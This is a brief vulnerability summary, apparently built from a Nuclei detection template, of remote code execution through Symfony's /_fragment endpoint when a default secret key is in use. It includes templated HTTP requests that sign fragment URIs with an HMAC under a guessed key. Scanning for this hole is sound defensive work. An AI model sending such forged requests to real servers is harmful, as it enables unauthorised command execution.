# Vulnerability: Symfony _fragment - Default Key RCE
**Classification:** RCE
**Source:** Nuclei Template (`symfony-default-key-rce.yaml`)

## Description
Symfony servers support a "/_fragment" command that allows clients to provide custom PHP commands and return the HTML output.
This template checks to see if they also use a popular default secret key for remote command execution.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/{{uri_part}}&_hash={{url_encode(base64(hex_decode(hmac("sha256","{{BaseURL}}/{{uri_part}}",badsecretkey))))}}
GET {{BaseURL}}/{{uri_part}}&_hash={{url_encode(base64(hex_decode(hmac("sha256","{{BaseURL}}/{{uri_part}}",secretkey))))}}
```

